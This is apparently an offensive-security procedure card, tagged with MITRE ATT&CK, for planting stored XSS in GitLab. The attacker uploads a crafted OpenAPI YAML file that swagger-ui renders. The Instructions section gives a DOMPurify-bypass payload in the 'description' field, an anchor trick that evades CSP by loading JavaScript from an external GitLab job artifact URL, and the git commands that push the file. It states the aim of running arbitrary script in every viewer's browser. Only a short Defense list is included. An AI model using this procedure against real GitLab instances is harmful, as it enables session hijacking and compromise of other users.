---
tags:
  - xss
  - file-upload
  - yaml
  - openapi
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - GitLab
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-13T23:52:25.120Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 7c5721c6-0489-4249-afc2-b8e8aa14a6c8
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Upload-Malicious-OpenAPI-YAML-File

## Summary

This procedure involves creating and uploading a malicious OpenAPI YAML file to a GitLab repository, embedding a stored XSS payload that bypasses DOMPurify sanitization in swagger-ui, setting up the vulnerability for execution upon viewing.

## Description

In the context of exploiting a stored XSS in GitLab's repository file viewer, this procedure crafts a YAML file with malicious HTML in fields like 'description'. The payload uses DOMPurify bypass techniques such as nested elements (e.g., form inside math, svg with textarea) and CSP evasion methods like data-remote=true on anchors to load external JavaScript from a controlled GitLab job artifact. Prerequisites include a GitLab account with repository creation and push permissions. Expected outcomes: The file is stored persistently, affecting all viewers without further interaction from the attacker.

## Requirements

1. Valid GitLab account with permissions to create repositories and upload files
2. Access to craft YAML with HTML payloads (text editor or IDE)
3. Optional: Control over a GitLab CI job to host the external JS payload

## Defense

Defensive measures and detection strategies:

- Update GitLab to versions patching swagger-ui and DOMPurify (e.g., post-14.10.5)
- Enable strict CSP headers to block inline scripts and data URLs
- Monitor repository uploads for suspicious YAML files containing HTML tags
- Use file type validation to restrict executable content in OpenAPI files

## Objectives

1. Persist malicious payload in a viewable repository file
2. Ensure payload survives sanitization during YAML rendering
3. Enable arbitrary JS execution for subsequent viewers

## Instructions

### Step 1: Create the Repository

**Context**: Set up a new repository to host the malicious file.

Log in to GitLab and create a new project/repository via the UI or Git commands. Initialize with a README if needed.

### Step 2: Craft the Malicious YAML Payload

**Context**: Embed the XSS payload in the YAML structure to exploit DOMPurify weaknesses.

Use a text editor to create `openapi.yaml` with content like:

```yaml
openapi: 3.0.0
info:
  title: Malicious API
  description: '<math><form><svg onload=alert(1)></svg></form></math>' # Example bypass; replace with full payload including iframe srcdoc for auto-execution
paths: {}
```

Enhance with CSP bypass: Include anchors with `data-remote=true data-type=script href="https://gitlab.com/yvvdwf/_/-/jobs/552156057/artifacts/raw/alert.js"`.

### Step 3: Upload the File

**Context**: Commit and push the file to make it viewable.

Use Git to add, commit, and push:

```bash
git add openapi.yaml
git commit -m "Add OpenAPI spec"
git push origin master
```

Or upload directly via GitLab web UI.

**Expected Output**: File appears in the repository tree; raw view shows intact payload.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Remote File Copy]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- file-upload
- yaml
